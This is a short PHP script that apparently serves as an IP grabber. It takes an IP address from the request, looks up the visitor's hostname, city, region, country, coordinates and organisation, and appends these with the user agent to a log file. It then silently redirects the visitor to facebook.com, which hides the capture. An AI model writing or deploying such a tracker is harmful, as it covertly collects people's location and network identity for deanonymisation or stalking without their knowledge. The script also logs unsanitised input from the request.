<?php
ob_start();
include 'func.php';
$pwd = getcwd();
$date = date('Y-m-d H:i:s');
if(isset($_GET['ip'])){ 

    $head = $_SERVER['REQUEST_METHOD'] .' - '. $_SERVER['SERVER_PROTOCOL'] . ' - ' . $_SERVER['PHP_SELF'] . ' - ' . $date . "\n" . $_SERVER['HTTP_USER_AGENT'] ;
    $ip = $_GET['ip'];

    $client_ip = $ip;
    $ipdetail = ip_details($client_ip);
    $ipinfo = 'ip => ' . $ipdetail->ip;
    $ipinfo .= ' | hostname => ' . $ipdetail->hostname;
    $ipinfo .= ' | city => ' . $ipdetail->city;
    $ipinfo .= ' | region => ' . $ipdetail->region;
    $ipinfo .= "\ncountry => " . $ipdetail->country;
    $ipinfo .= ' | loc => ' . $ipdetail->loc;
    $ipinfo .= ' | org => ' . $ipdetail->org;

    $push = str_repeat("-", 40) . "\n" . $head ."\n". $ipinfo ."\n" . str_repeat("-", 40) . "\n";
    // $push = $head . $ip;
    $ret = file_put_contents('data/access.log', $push, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
    	$url = 'http://facebook.com'; //define your location you want to redirect
    	header('Location: ' . $url); exit();
    }


}
else {
   die('no post data to process');
}


?>